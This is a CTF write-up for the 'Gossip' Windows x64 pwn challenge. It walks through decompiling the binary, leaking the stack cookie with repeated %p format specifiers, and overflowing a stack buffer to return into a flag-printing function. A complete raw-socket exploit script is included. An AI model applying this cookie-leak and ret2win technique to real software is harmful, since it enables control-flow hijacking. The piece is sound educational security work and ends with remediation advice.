# Gossip

- **CTF:** NexSec CTF
- **Category:** Pwn (Windows x64)
- **Artifacts:** `gossips.exe`, `exploit.py`
- **Flag:** `nexsec26{6e75740b9b2285abb6ad864c1445c3f398356116ac7a07fa9c51f2abfbb12c3a}`

---

## Overview

`gossips.exe` — *"the watercooler that never forgets"* — is a Windows x64 console
program. It asks for a name, invites you to *"tell me a secret"*, echoes that
secret back through a `printf`-style call, then asks for your *"last words"* and
reads them into a fixed stack buffer. Two bugs chain:

1. the secret echo uses the **user input as the format string** (stack leak), and
2. the last-words read is an **unbounded copy into a fixed stack buffer** (overflow).

The binary also ships a `win` function that prints `flag.txt`. The solve is:
leak the stack cookie through the format string, then overflow the saved return
address into `win`.

Everything below is the order it actually happened: handout → decompile with
Dogbolt → spot the bugs → local Wine attempts that failed → remote leak →
ret2win.

---

## Step 1 — Handouts

```
$ file gossips.exe
gossips.exe: PE32+ executable for MS Windows 6.00 (console), x86-64, 6 sections

$ sha256sum gossips.exe exploit.py flag.txt
0f0892192774768aebff3043bc16f855ddb1cfaaed2c992c4d075b2eed81d506  gossips.exe
f5fab87bda11286ceadb5f7dc8b14c9a8c3d19d531d89d95d3a85fc2140651a0  exploit.py
35c4980b698f1e89caba97d0f000f5f354d9271a3e30925706afba8bc054a931  flag.txt
```

`gossips.exe` is **156160 bytes**; image base `0x140000000`. The local `flag.txt`
is only a placeholder (`FLAG{test_local_only}`, 22 bytes) — the real flag lives on
the remote instance.

Strings worth grabbing:

```
=== gossips: the watercooler that never forgets ===
[gossips] before you sit down... who are you?
[gossips] so... tell me a secret. i PROMISE i won't tell anyone.
[gossips] wow. okay. well:
[gossips] curiosity killed the cat, and gossips killed the watercooler.
[gossips] last words before it all burns?
[gossips] ...it's all gone now.
FLAG: %s
FLAG: FLAG-NOT-CONFIGURED      ; fallback when flag.txt is missing
```

---

## Step 2 — Decompile with Dogbolt

I uploaded `gossips.exe` to **Dogbolt (Decompiler Explorer, dogbolt.org)** and
read the **Hex-Rays / Binary Ninja** views. Two functions matter. Dogbolt's
Hex-Rays view names them by address:

- `sub_1400010F0` — `main`
- `sub_140001000` — an unreferenced function that opens `flag.txt` (`win`)

The decompiled `main` (abridged) is a loop of three prompts backed by a
`printf`-style helper `sub_1400012E0`:

```c
// sub_1400010F0  (main)  -- Hex-Rays view, abridged
sub_1400012E0(name_buf);              // echo(name)
sub_1400012E0(secret_buf);            // echo(secret)   <-- format string
...
ReadFile(stdin, last_words_buf, 0x200, &n, 0);   // <-- no length check
```

`sub_1400012E0` is a `printf` shim: it spills the register arguments into the
shadow space and calls the varargs engine with the caller's buffer sitting in the
format position. No `"%s"` literal is applied. So the echoed buffer *is* the
format string, and any `%p` the player types walks the stack.

---

## Step 3 — Spot the two bugs

**Bug A — format-string leak.** The name and secret are echoed through
`sub_1400012E0` without a `"%s"`. Sending `%p %p %p …` dumps pointers, and the
`/GS` stack cookie is among them.

**Bug B — stack overflow.** The three reads in `main` differ only in bounds
checks (addresses as Dogbolt/Hex-Rays shows them):

| Read | Destination | Max bytes | Bounds check |
|---|---|---|---|
| name | `[rsp+0x38]` | `0x17` | `cmp rcx,0x18 / jae` — safe |
| secret | `[rsp+0x90]` | `0xc8` (200) | `cmp rdx,0xc9 / jae` — safe |
| last words | `[rsp+0x50]` | `0x200` (512) | **none — the ReadFile count is discarded** |

So the last-words read at `lea rdx,[rsp+0x50]` / `mov r8d,0x200` / `call
ReadFile` copies up to 512 bytes with no limit. The `/GS` cookie sits between the
buffer and the saved return address, so the overflow must preserve it — which is
exactly what the format-string leak gives us.

The relevant frame slots (from `main`'s prologue `push rbx; sub rsp,0x170`):

| Slot (`rsp`) | Item | Offset from last-words buffer (`0x50`) |
|---|---|---|
| `+0x50` | last-words buffer (overflow source) | `0x00` |
| `+0x160` | `/GS` cookie | `0x110` |
| `+0x168` | padding | `0x118` |
| `+0x170` | saved `rbx` | `0x120` |
| `+0x178` | saved return address | `0x128` |

→ `COOKIE_OFFSET = 0x160 − 0x50 = 0x110`, `RETURN_OFFSET = 0x178 − 0x50 = 0x128`.

A wrong cookie does not return — the check fails into `mov ecx,2; int 0x29`
(`__fastfail`).

---

## Step 4 — Find `win`

`sub_140001000` is never called from `main`; it is reachable only by hijacking the
saved return address. The Hex-Rays view (abridged):

```c
// sub_140001000  (win)
f = fopen("flag.txt", "rb");
if (!f) { printf("FLAG: FLAG-NOT-CONFIGURED"); }
else    { fgets(buf, ...f); printf("FLAG: %s", buf); }
fflush(stdout);
ExitProcess(0);
```

So `WIN = 0x140001000`. The plan: leak the cookie, rebuild the frame up to the
return address, and `ret` into `win`.

---

## Step 5 — First attempt: local Wine + pwntools (failed)

The first pass tried to run it locally under Wine and let pwntools do the work.
I wrote a fresh script almost every couple of minutes — **50 revisions of
`exploit.py` are preserved in VSCode's local history** for this challenge (timestamps in `~/.config/Code/User/History/-6ff3f023/`). The early ones all
looked like this (version `ugZi.py`, 17:08):

```python
p = process(['wine', './gossips.exe'], env={"TERM": "dumb"})
p.recvuntil(b'who are you?');  p.sendline(b'hi')
p.recvuntil(b'a secret');      p.send(b'.'.join([b'%p'] * 45))
leak = p.recvuntil(b'last words')
# ... strip ANSI, split on '.', grab a "canary" ...
payload  = b'A' * 0x110 + p64(canary) + p64(0) + p64(0x140001000)
```

The hard part was **identifying the cookie** among the leaked values. Revision
after revision tried a different heuristic:

- "top 16 bits are 0 and value > 0x1000000" (`ugZi`, `AZco`)
- "canary is at index 39 / index 43" (`u0o6`, `W49g`)
- "the value immediately after a zero" (`grkF`)
- "starts with `00007`" / "ends in `00`" (`U0AC`, `Q2dI`)
- "largest non-code value" (`nWVW`)
- "12-char value starting with `0000`" (`XeY1`)

None of them reliably picked the cookie out — several were grabbing **stack
pointers** (values like `0x00007ffffe1ffcf0`) that merely happened to start with
`0000`. There was also repeated guessing at the return offset: `0xE8`, `0x100`,
`0x110`, `0x118`, `0x120`, `0x128`, `0x130`, `0x138`, `0x140`.

I also tried using a `cyclic()` pattern + `cyclic_find()` to locate the offset
autonomously (`twZf`, `RoWq`, `oBmJ`, `IFLt`) instead of guessing.

---

## Step 6 — Move remote; the offsets that failed

Local Wine behaviour did not transfer cleanly, so I switched to the remote
service at **`koala.nexsec.my`** (the instance port changes per launch — seen as
**37146**, **38017**, then **36031**). The preserved terminal transcript shows the
failure sequence:

```
[*] Found Canary: 0x7ffffe1ffcf0
Could not find offset in crash dump.
 before it all burns?
[gossips] ...it's all gone now.

Offset 0x100 failed.
Offset 0x108 failed.
Offset 0x110 failed.
Offset 0x118 failed.
Offset 0x120 failed.
Offset 0x128 failed.
Offset 0x130 failed.
Offset 0x138 failed.

Canary: 0x7ffffe1fff00
 before it all burns?
[gossips] ...it's all gone now.

Canary: 0x6543b61dac48
 before it all burns?
[gossips] ...it's all gone now.
```

Two problems visible:

- the "canary finder" was returning a **wine/stack pointer** (`0x7ffffe1ffcf0`,
  `0x7ffffe1fff00`) rather than the real cookie, so every payload corrupted the
  cookie and hit `__fastfail`;
- the offset sweep was guessing instead of using the frame math.

The `0x6543b61dac48` value (version `cBtY`, 19:16, which grabbed `vals[-2]`) was
closer — a real 48-bit random-looking value — but the wrong index.

---

## Step 7 — Working leak: `%p` × 48, cookie at index 44

The fix was to stop guessing the cookie's *identity* from its shape and instead
fix its *position*. Sending 48 space-separated `%p` values every time and taking
the 44th produces the cookie deterministically:

```python
recv_until(s, b"tell me a secret.")
s.sendall(b"%p " * 48 + b"\n")
out = recv_until(s, b"last words before it all burns?")
leak = out.decode(errors="replace").split("wow. okay. well:")[-1]
leak = leak.split("[gossips] curiosity")[0]
values = re.findall(r"\b[0-9a-fA-F]{16}\b", leak)   # 48 full-width values
cookie = int(values[43], 16)                          # COOKIE_INDEX = 44
```

`COOKIE_INDEX = 44` is 1-based, i.e. `values[43]`. This run printed
`[+] Leaked values: 48` and `[+] Stack cookie: 0xca049b4ada4`.

---

## Step 8 — Build the payload (ret2win + stack alignment)

With the cookie known, the payload is assembled against the frame math from
Step 3:

```python
WIN         = 0x140001000
RET_GADGET  = 0x1400012D8     # the `ret` in main's own epilogue
COOKIE_OFFSET = 0x110
RETURN_OFFSET = 0x128

payload  = b"A" * COOKIE_OFFSET          # fill up to the cookie
payload += p64(cookie)                   # restore the /GS cookie
payload  = payload.ljust(RETURN_OFFSET, b"B")   # pad padding + saved rbx
payload += p64(RET_GADGET)               # align rsp (see below)
payload += p64(WIN)                      # ret2win
s.sendall(payload + b"\n")
```

The extra `ret` (`0x1400012d8`) is required for **x64 16-byte stack alignment**.
`win` calls `fopen`/`printf`, which use aligned SSE accesses; jumping straight
into `win` with a misaligned `rsp` faults before the file opens. One `ret`
advances `rsp` by 8 bytes and restores the alignment the callee expects.

---

## Step 9 — Run it

```
[arif@archlinux Gossip]$ /usr/bin/python /home/arif/Desktop/CTF/NexSec/Pwn/Gossip/exploit.py
[+] Connected to server
[+] Leaked values: 48
[+] Stack cookie: 0xca049b4ada4
[+] Sending exploit...
[gossips] ...it's all gone now.
FLAG: nexsec26{6e75740b9b2285abb6ad864c1445c3f398356116ac7a07fa9c51f2abfbb12c3a}
[arif@archlinux Gossip]$
```

---

## Flag & Proof of Concept

```
nexsec26{6e75740b9b2285abb6ad864c1445c3f398356116ac7a07fa9c51f2abfbb12c3a}
```

The leaked cookie (`0xca049b4ada4`) and the `Leaked values: 48` count are
consistent with `COOKIE_INDEX = 44` / `COOKIE_OFFSET = 0x110` in `exploit.py`.
The recovered value is the **remote** flag, not the local placeholder: the local
`flag.txt` is `FLAG{test_local_only}`, and the server's line is printed by the
`FLAG: %s` path in `win`.

Final solver (`exploit.py`, stdlib `socket`/`struct`/`re` only — no pwntools):

```python
import socket, struct, re

HOST = "koala.nexsec.my"
PORT = 36031                     # per-instance port
WIN         = 0x140001000
RET_GADGET  = 0x1400012D8
COOKIE_INDEX  = 44
COOKIE_OFFSET = 0x110
RETURN_OFFSET = 0x128

def p64(v): return struct.pack("<Q", v)

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk: raise ConnectionError("disconnected")
        data += chunk
    return data

with socket.create_connection((HOST, PORT), timeout=10) as s:
    s.settimeout(5)
    recv_until(s, b"who are you?");      s.sendall(b"arif\n")
    recv_until(s, b"tell me a secret."); s.sendall(b"%p " * 48 + b"\n")
    out = recv_until(s, b"last words before it all burns?")
    leak = out.decode(errors="replace").split("wow. okay. well:")[-1]
    leak = leak.split("[gossips] curiosity")[0]
    values = re.findall(r"\b[0-9a-fA-F]{16}\b", leak)
    cookie = int(values[COOKIE_INDEX - 1], 16)

    payload  = b"A" * COOKIE_OFFSET
    payload += p64(cookie)
    payload  = payload.ljust(RETURN_OFFSET, b"B")
    payload += p64(RET_GADGET)
    payload += p64(WIN)
    s.sendall(payload + b"\n")
    print(s.recv(4096).decode(errors="replace"))
```

---

## Evidence

- **Artifacts hashed** (Step 1); originals unchanged.
- **Dogbolt used:** Brave history records Decompiler Explorer sessions during the
  CTF window (`https://dogbolt.org/?id=6eb64041-…`, `…id=1b74f315-…` on
  **2026-10-17 11:22**, and later sessions), viewed through the Binary Ninja /
  Hex-Rays / Ghidra panes.
- **50 `exploit.py` revisions** preserved in VSCode local history
  (`~/.config/Code/User/History/-6ff3f023/`, 2026-10-17 17:08 → 19:20), covering
  the Wine attempts, the heuristics, the offset sweeps and the final raw-socket
  solver (`4NXO.py`, 19:20).
- **Recorded exploit run** in the VSCode terminal scrollback
  (`~/.config/Code/User/workspaceStorage/5b3651ba2dfab8b16581b0c41aadbf83/state.vscdb`):
  the transcript in Step 9, including the failure runs of Step 6.

> Note: the instance provider is no longer reachable, so the flag is verified via
> the archived terminal transcript. The exploit and offsets are preserved and
> unchanged.

---

## Remediation / Key Takeaways

- **Root causes:** (1) user input passed as a `printf` format string; (2) an
  unbounded copy into a fixed stack buffer followed by control-flow overwrite.
- **Fixes:** always call `printf("%s", buf)`; use bounded copies (`snprintf`,
  `strncpy_s`) and validate length; keep flag-printing routines out of the
  binary entirely. `/GS` + ASLR is not a defence when the cookie can be leaked.
- **Lesson:** a format-string leak defeats the stack cookie. Once leaked, a
  `ret`-aligned `ret2win` is enough. When a leak contains many pointers, pin the
  cookie by **position** (fixed `%p` count + fixed index), not by guessing its
  shape — the "looks like a cookie" heuristics here were what burned the first
  ~20 attempts.
